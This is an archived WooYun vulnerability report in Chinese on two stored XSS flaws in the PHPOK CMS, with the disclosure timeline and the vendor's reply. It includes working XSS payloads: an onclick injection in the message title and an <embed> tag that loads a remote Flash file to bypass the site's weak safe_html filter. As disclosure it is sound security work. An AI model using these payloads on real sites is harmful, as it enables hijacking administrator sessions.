{"id": 51668, "wybug_id": "wooyun-2014-073758", "wybug_title": "PHPOK 存储型 xss两处", "wybug_corp": "phpok.com", "wybug_author": "路人甲", "wybug_date": "2014-08-26 16:15", "wybug_open_date": "2014-11-24 16:16", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-24：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 前台功能存在存储型 xss，可攻击后台，获取管理员权限。 详细说明：  第一处xss漏洞：留言功能。后台的输出点有一处输出如下：\n<a class=\"icon delete end\" onclick=\"content_del('1299','[输入]')\" title=\"删除\"></a>\n可以看出，我们留言的标题直接输出在 onclick 事件中了，可简单构造 '+alert(1)+'，管理员删除留言时触发：\n\n此时输出：\n<a class=\"icon delete end\" onclick=\"content_del('1299','test'+alert(1)+'')\" title=\"删除\"></a>\n\n\n第二处xss漏洞：PHPOK 过滤 XSS 的函数如下：\nfunction safe_html($info)\t{\t\tif(!$info)\t\t{\t\t\treturn false;\t\t}\t\t$tmp = \"/<([a-zA-Z0-9]+)(.*)(on[abort|beforeonload|blur|change|click|contextmenu|dblclick|drag|dragend|dragenter|dragleave|dragstart|drop|error|focus|keydown|keypress|keyup|load|message|mousedown|mousemove|mouseover|mouseout|mouseup|mousewheel|reset|resize|scroll|select|submit|unload]+)=(.+)>/isU\";\t\t$info = preg_replace($tmp,\"<\\\\1\\\\2\\\\4>\",$info);\t\t//$info = preg_replace(\"/<([a-zA-Z0-9]+)(.*)([onabort|onbeforeonload|onblur|onchange|onclick|oncontextmenu|ondblclick|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror|onfocus|onkeydown|onkeypress|onkeyup|onload|onmessage|onmousedown|onmousemove|onmouseover|onmouseout|onmouseup|onmousewheel|onreset|onresize|onscroll|onselect|onsubmit|onunload]+)\\s*=\\s*(.+)>/isU\",\"<\\\\1\\\\3>\",$info);\t\t$tmp = array(\"/<script(.*)<\\/script>/isU\",\"/<frame(.*)>/isU\",\"/<\\/fram(.*)>/isU\",\"/<iframe(.*)>/isU\",\"/<\\/ifram(.*)>/isU\",\"/<style(.*)<\\/style>/isU\",\"/<link(.*)>/isU\",\"/<\\/link>/isU\");\t\t$info = preg_replace($tmp,'',$info);\t\treturn $info;\t}\n可见只对标签和 on 事件属性做了一些过滤，可轻松绕过。比如，通过引入 flash 文件进行 xss：\n<embed src=\"http://chuhades.sinaapp.com/xss.swf\" quality=\"high\" bgcolor=\"#ffffff\" width=\"500\" height=\"500\" name=\"FlashVars\" align=\"middle\" allowscriptaccess=\"always\" flashvars=\"action=eval&codz=alert(document.domain)\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\">\n前台：\n\n后台：\n\n   漏洞证明：  第一处xss证明：\n\n第二处xss证明：前台：\n\n后台：\n\n   修复方案：  对进入 js，html 标签事件的字符串进行 js 编码   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-26 18:45 厂商回复： 感谢您提供的BUG，哎，现在才知道你们太牛了！ 最新状态： 2014-11-12：请安装最新版  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}